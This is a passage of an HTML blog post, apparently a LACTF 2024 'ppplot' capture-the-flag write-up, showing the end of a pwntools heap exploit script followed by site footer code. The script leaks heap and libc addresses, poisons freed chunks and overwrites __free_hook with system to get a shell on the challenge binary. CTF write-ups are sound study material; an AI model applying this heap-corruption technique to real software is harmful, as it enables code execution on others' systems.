+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pp: &#39;</span>, str(<span style="color:#ae81ff">5</span>))
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;idx: &#39;</span>, str(idx))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_</span>():
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pp: &#39;</span>, str(<span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">arith</span>(idx):
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pp: &#39;</span>, str(<span style="color:#ae81ff">3</span>))
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;idx: &#39;</span>, str(idx))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./bc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./out.bin&#39;</span>) <span style="color:#75715e"># already patched </span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x9</span>):
+</span></span><span style="display:flex;"><span>    mk_eq(<span style="color:#ae81ff">10</span>, [<span style="color:#ae81ff">26739</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x9</span>):
+</span></span><span style="display:flex;"><span>    free(i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x7</span>):
+</span></span><span style="display:flex;"><span>    mk_eq(<span style="color:#ae81ff">10</span>, [<span style="color:#ae81ff">26739</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">0x4</span>, [<span style="color:#ae81ff">26739</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">7</span>) 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># idx 8 -&gt; 4 | idx7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>arith(<span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;(-1, &#39;</span>)
+</span></span><span style="display:flex;"><span>neg_cx <span style="color:#f92672">=</span> int(rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;(1, &#39;</span>)
+</span></span><span style="display:flex;"><span>pos_cx <span style="color:#f92672">=</span> int(rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>v <span style="color:#f92672">=</span> (((neg_cx <span style="color:#f92672">+</span> pos_cx))<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>heap <span style="color:#f92672">=</span> ( (((pos_cx <span style="color:#f92672">-</span> v)) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">|</span> v<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span> )
+</span></span><span style="display:flex;"><span>success(hex(heap))
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">2</span>,[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>) <span style="color:#75715e"># idx 17</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+</span></span><span style="display:flex;"><span>    mk_eq(<span style="color:#ae81ff">10</span>,[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+</span></span><span style="display:flex;"><span>    free(i<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>    mk_eq(<span style="color:#ae81ff">0</span>,[])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x280</span>
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">4</span>,[target<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>,target<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">8</span>,[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">4</span>,[<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x461</span>,<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># +0x460, there&#39;s a prev inusebit enabled sz. </span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># just reclaiming a freed chunk and changing a content ptr let me leak libc.</span>
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">10</span>,[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>) <span style="color:#75715e"># 33</span>
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">10</span>,[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>) <span style="color:#75715e"># 34</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">33</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">34</span>)
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x338</span>
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">4</span>,[<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0</span>,target,target<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>]) 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">gef&gt; x/4xg 0x55db06567330+8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x55db06567338: 0x00000000000003c1      0x00007fe33e2c6be0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x55db06567348: 0x00007fe33e2c6be0      0x0000000000000000&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>arith(<span style="color:#ae81ff">33</span>)
+</span></span><span style="display:flex;"><span>rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;(-1, &#39;</span>)
+</span></span><span style="display:flex;"><span>neg_cx <span style="color:#f92672">=</span> int(rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;(1, &#39;</span>)
+</span></span><span style="display:flex;"><span>pos_cx <span style="color:#f92672">=</span> int(rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>v <span style="color:#f92672">=</span> (((neg_cx <span style="color:#f92672">+</span> pos_cx))<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> ( (((pos_cx <span style="color:#f92672">-</span> v)) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">|</span> v<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span> ) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ecbe0</span>
+</span></span><span style="display:flex;"><span>success(hex(libc_base))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">10</span>,[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">10</span>,[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">36</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">37</span>)
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">4</span>,[<span style="color:#ae81ff">26739</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+</span></span><span style="display:flex;"><span>    mk_eq(<span style="color:#ae81ff">10</span>,[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+</span></span><span style="display:flex;"><span>    free(i<span style="color:#f92672">+</span><span style="color:#ae81ff">38</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#ae81ff">38</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>    mk_eq(<span style="color:#ae81ff">0</span>,[])
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>__free_hook
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">4</span>,[target<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>,target<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">8</span>,[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>mk_eq(<span style="color:#ae81ff">4</span>,[(libc_base<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>,(libc_base<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># +0x460, there&#39;s a prev inuse bit enabled sz. </span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">36</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://msh1307.kr/tags/lactf2024/">LACTF2024</a></li>
+      <li><a href="https://msh1307.kr/tags/lactf-ppplot/">LACTF ppplot</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
